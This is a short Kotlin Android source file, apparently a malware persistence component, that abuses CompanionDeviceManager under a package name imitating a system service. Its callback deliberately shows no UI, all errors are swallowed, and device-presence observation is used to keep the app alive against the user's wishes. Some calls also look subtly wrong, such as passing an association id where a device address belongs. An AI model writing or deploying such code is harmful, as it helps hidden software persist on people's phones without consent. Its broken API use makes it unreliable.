// [context: Kotlin, Android API 31+, CompanionDeviceManager association for wake]
package com.system.service.persistence

import android.companion.*
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi

@RequiresApi(Build.VERSION_CODES.S)
class CompanionDeviceHook(private val context: Context) {

    private val cdm = context.getSystemService(CompanionDeviceManager::class.java)

    fun requestAssociation(activity: android.app.Activity) {
        val request = AssociationRequest.Builder()
            .addDeviceFilter(
                WifiDeviceFilter.Builder().build()
            )
            .setSingleDevice(false)
            .build()

        cdm.associate(request, object : CompanionDeviceManager.Callback() {
            override fun onDeviceFound(chooserLauncher: android.app.PendingIntent) {
                // silent — no UI shown
            }
            @Deprecated("Deprecated in Java")
            override fun onFailure(error: CharSequence?) {}
        }, null)
    }

    // API 33+: self-managed association keeps app alive
    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    fun selfManage() {
        try {
            val associations = cdm.myAssociations
            if (associations.isEmpty()) return
            val assocId = associations[0].id
            cdm.startObservingDevicePresence(assocId.toString())
        } catch (_: Exception) {}
    }
}
